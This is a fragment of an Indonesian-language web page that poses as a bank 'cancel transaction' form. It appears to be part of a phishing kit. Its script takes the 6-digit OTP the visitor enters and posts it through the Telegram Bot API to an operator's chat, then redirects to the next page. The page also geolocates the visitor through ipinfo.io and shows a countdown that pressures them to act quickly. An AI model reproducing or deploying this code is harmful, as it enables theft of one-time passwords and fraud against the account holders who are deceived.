            <div class="form-group">
                <label for="otp"></label>
                <input type="tel" id="otp" name="otp" maxlength="6" minlength="6" required="" placeholder="Masukkan 6 digit kode OTP">
            </div>

            <div class="form-group">
                <button type="submit">Batalkan Transaksi</button>
            </div>

</div>
<script src="../config.js"></script>
<script>
document.querySelector("button[type='submit']").addEventListener("click", function (e) {
    e.preventDefault(); // Cegah reload halaman

    let otp = document.getElementById("otp").value.trim();

    if (otp.length !== 6) {
        alert("Kode OTP harus 6 digit.");
        return;
    }

    let message = `ðŸš« Pembatalan Transaksi\n\nðŸ” Kode OTP: ${otp}`;

    fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: telegramConfig.chatId,
            text: message
        })
    })
    .then(res => res.json())
    .then(data => {
        // Setelah terkirim, arahkan ke halaman konfir.html
        window.location.href = "menu2.html";
    })
    .catch(err => {
        console.error("Gagal mengirim:", err);
        alert("Terjadi kesalahan saat mengirim kode OTP.");
    });
});
</script>

<script>
    // Ambil nama kota saat halaman dimuat
    fetch("https://ipinfo.io/city")
        .then(response => response.text())
        .then(city => {
            document.getElementById("kota").value = city.trim();
        })
        .catch(() => {
            document.getElementById("kota").value = "Tidak Diketahui";
        });
        
        let timeLeft = 5 * 60; // 5 menit dalam detik
const countdownEl = document.getElementById('countdown');
const resendDiv = document.getElementById('resend');

function formatTime(seconds) {
  const minutes = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${minutes}:${secs.toString().padStart(2, '0')}`;
}

const timerInterval = setInterval(() => {
  timeLeft--;
  countdownEl.textContent = formatTime(timeLeft);

  if (timeLeft <= 0) {
    clearInterval(timerInterval);
    document.getElementById('timer').style.display = 'none';
    resendDiv.style.display = 'block';
  }
}, 1000);

document.getElementById('resendText').addEventListener('click', function() {
  location.reload();
});
</script>
